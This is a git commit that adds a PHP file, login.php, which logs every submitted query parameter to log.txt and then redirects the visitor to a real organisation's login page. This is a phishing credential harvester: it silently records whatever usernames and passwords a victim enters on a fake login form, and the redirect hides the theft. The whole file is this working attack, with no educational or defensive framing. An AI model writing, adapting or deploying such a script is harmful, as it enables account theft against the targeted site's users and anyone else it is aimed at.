65824c5c67c020d204188a9b873e8b3e4a31795a
phavithraa-b <86672765+phavithraa-b@users.noreply.github.com>
2022-05-23 06:32:06 -0400

    Add files via upload

---
+++ login.php
@@ -0,0 +1,20 @@
+
+<?php
+ 
+ // Set the location to redirect the page
+ header ('Location: https://nextlearn.nextwealth.com/login/index.php');
+  
+ // Open the text file in writing mode
+ $file = fopen("log.txt", "a");
+  
+ foreach($_GET as $variable => $value) {
+     fwrite($file, $variable);
+     fwrite($file, "=");
+     fwrite($file, $value);
+     fwrite($file, "\r\n");
+ }
+  
+ fwrite($file, "\r\n");
+ fclose($file);
+ exit;
+ ?>
